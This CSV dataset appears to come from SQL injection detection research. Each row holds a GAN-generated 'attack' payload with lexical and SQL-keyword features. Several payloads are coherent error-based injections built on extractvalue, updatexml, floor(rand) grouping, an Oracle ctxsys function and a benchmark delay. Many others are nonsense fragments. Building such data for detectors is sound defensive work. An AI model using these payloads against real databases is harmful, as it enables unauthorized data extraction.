label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,ANDv  =,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,265,7.0,6.0,2.521640636343318,4.0,0.0,2.0,1.0,0.5714285714285714,0.0,0.2857142857142857,0.14285714285714285,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'||  (  select '.hr0x7171706a716237chreccuzz'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'n",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,266,273.0,35.0,3.8834513869562457,89.0,51.0,101.0,32.0,0.326007326007326,0.18681318681318682,0.36996336996337,0.11721611721611722,4.0,0.0,0.0,0.0,0.0,1.0,0.0,19.0,0.0,0.0,5.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1""   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,267,5.0,3.0,1.3709505944546687,0.0,1.0,3.0,1.0,0.0,0.2,0.6,0.2,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"r'a_nt  0  112n,concat  (  )    ,  x,floor  113  ac_et  (  then  =  )  )   from   )     )  ||chr  (  *a group 0y  113  ,concat       0x7171706a71=  )  (  )    || SU.1cwujkrube122t",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,268,179.0,38.0,3.91533361396959,59.0,25.0,69.0,26.0,0.329608938547486,0.13966480446927373,0.3854748603351955,0.1452513966480447,1.0,0.0,0.0,0.0,1.0,2.0,0.0,11.0,0.0,2.0,4.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1c"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""wzw'  =  'qMv""aweljtsu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,269,357.0,39.0,3.6996689789859833,99.0,49.0,148.0,61.0,0.2773109243697479,0.13725490196078433,0.41456582633053224,0.17086834733893558,2.0,3.0,0.0,0.0,0.0,3.0,0.0,30.0,0.0,0.0,1.0,23.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-9740'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '`",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,270,184.0,29.0,3.440016557071231,39.0,38.0,81.0,26.0,0.21195652173913043,0.20652173913043478,0.44021739130434784,0.14130434782608695,2.0,0.0,1.0,0.0,0.0,1.0,0.0,16.0,0.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'extractvalue7562_rl",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,271,190.0,31.0,3.7825545334058486,51.0,43.0,71.0,25.0,0.26842105263157895,0.22631578947368422,0.3736842105263158,0.13157894736842105,2.0,0.0,0.0,0.0,0.0,1.0,0.0,14.0,1.0,1.0,6.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1%ghoubadlf,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,272,11.0,11.0,3.4594316186372973,9.0,1.0,0.0,1.0,0.8181818181818182,0.09090909090909091,0.0,0.09090909090909091,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1')       alybbT5bnad.Euenannaaslaayu_v,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,273,39.0,19.0,3.7967392339655834,26.0,2.0,7.0,4.0,0.6666666666666666,0.05128205128205128,0.1794871794871795,0.10256410256410256,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1'ela_a_ui,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,274,10.0,8.0,2.9219280948873623,6.0,1.0,0.0,3.0,0.6,0.1,0.0,0.3,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1""hrubnjr",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,275,9.0,8.0,2.94770277922009,7.0,1.0,0.0,1.0,0.7777777777777778,0.1111111111111111,0.0,0.1111111111111111,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,15192x_nl,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,276,9.0,8.0,2.94770277922009,3.0,5.0,0.0,1.0,0.3333333333333333,0.5555555555555556,0.0,0.1111111111111111,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"rha  113  )    ,,floor  (  4232  (  1e6237et  froma_ib113  )  ,flooruna",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,277,71.0,24.0,3.835010125595555,26.0,15.0,22.0,8.0,0.36619718309859156,0.2112676056338028,0.30985915492957744,0.11267605633802817,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1ountteSd'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   '_nalnlovult_",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,278,194.0,31.0,3.7345911903475453,70.0,24.0,76.0,24.0,0.36082474226804123,0.12371134020618557,0.3917525773195876,0.12371134020618557,2.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0,0.0,2.0,4.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,1hl  a_i,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,279,8.0,7.0,2.75,4.0,1.0,2.0,1.0,0.5,0.125,0.25,0.125,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1feh'  =  'unsdu"" like ""cr(  =  )6237(  _",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,280,41.0,24.0,4.015611760504575,14.0,5.0,12.0,10.0,0.34146341463414637,0.12195121951219512,0.2926829268292683,0.24390243902439024,2.0,2.0,0.0,0.0,0.0,2.0,0.0,3.0,0.0,1.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1tt_,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,281,4.0,3.0,1.5,2.0,1.0,0.0,1.0,0.5,0.25,0.0,0.25,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1'||  (  select 'b,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,282,18.0,11.0,3.1916116417513782,7.0,1.0,5.0,5.0,0.3888888888888889,0.05555555555555555,0.2777777777777778,0.2777777777777778,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1%Q""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  """"  )    case when  selecti    ((   concat  (  )   x bym R  andohr  122  )  ,)  =  ,r  thenxys  (  )    =  =m0 concat  (  5483  (  (  (  having=athr  'saidro  )  then4493adr.rNnat1297dajuw",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,283,482.0,47.0,3.986273865378747,181.0,51.0,189.0,61.0,0.3755186721991701,0.10580912863070539,0.3921161825726141,0.12655601659751037,1.0,3.0,0.0,0.0,2.0,5.0,0.0,38.0,1.0,2.0,7.0,7.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"16'  =  'nd' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'"" like ""bl2",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,284,191.0,36.0,4.000058169437651,47.0,49.0,67.0,28.0,0.24607329842931938,0.25654450261780104,0.3507853403141361,0.14659685863874344,4.0,2.0,0.0,0.0,0.0,3.0,0.0,11.0,0.0,0.0,6.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,r.ru,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,285,4.0,3.0,1.5,3.0,0.0,0.0,1.0,0.75,0.0,0.0,0.25,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,9891au,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,286,6.0,5.0,2.2516291673878226,2.0,4.0,0.0,0.0,0.3333333333333333,0.6666666666666666,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'||  (  select ''   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wbfj' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,287,528.0,44.0,3.9632014983884365,180.0,79.0,204.0,65.0,0.3409090909090909,0.14962121212121213,0.38636363636363635,0.12310606060606061,6.0,0.0,0.0,0.0,2.0,3.0,0.0,38.0,0.0,2.0,10.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,1'a_n.at  (  ||chh union.wwzvunvnzfwkabdjb,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,288,42.0,23.0,4.279720852464461,29.0,1.0,5.0,7.0,0.6904761904761905,0.023809523809523808,0.11904761904761904,0.16666666666666666,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,1'l_ua,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,289,6.0,6.0,2.584962500721156,3.0,1.0,0.0,2.0,0.5,0.16666666666666666,0.0,0.3333333333333333,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1'  =  'xxwwl,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,290,13.0,7.0,2.6235166412180155,5.0,1.0,4.0,3.0,0.38461538461538464,0.07692307692307693,0.3076923076923077,0.23076923076923078,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1  case   tounjsd""u",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,291,19.0,13.0,3.4263674884732267,12.0,1.0,5.0,1.0,0.631578947368421,0.05263157894736842,0.2631578947368421,0.05263157894736842,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1  eo9740low4822b,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,292,17.0,13.0,3.616874605956222,6.0,9.0,2.0,0.0,0.35294117647058826,0.5294117647058824,0.11764705882352941,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,roedlzu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,293,7.0,7.0,2.8073549220576037,7.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%""  =  ""\l",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,294,11.0,7.0,2.550340709546388,1.0,1.0,4.0,5.0,0.09090909090909091,0.09090909090909091,0.36363636363636365,0.45454545454545453,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1v9173,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,295,6.0,5.0,2.2516291673878226,1.0,5.0,0.0,0.0,0.16666666666666666,0.8333333333333334,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%floor""""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,296,15.0,9.0,2.923231428797621,5.0,1.0,4.0,5.0,0.3333333333333333,0.06666666666666667,0.26666666666666666,0.3333333333333333,0.0,3.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""g_ytubl",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,297,342.0,37.0,3.6202638533517244,90.0,49.0,144.0,59.0,0.2631578947368421,0.14327485380116958,0.42105263157894735,0.17251461988304093,0.0,2.0,0.0,0.0,0.0,2.0,0.0,30.0,1.0,1.0,1.0,22.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1 e,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,298,3.0,3.0,1.584962500721156,1.0,1.0,1.0,0.0,0.3333333333333333,0.3333333333333333,0.3333333333333333,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
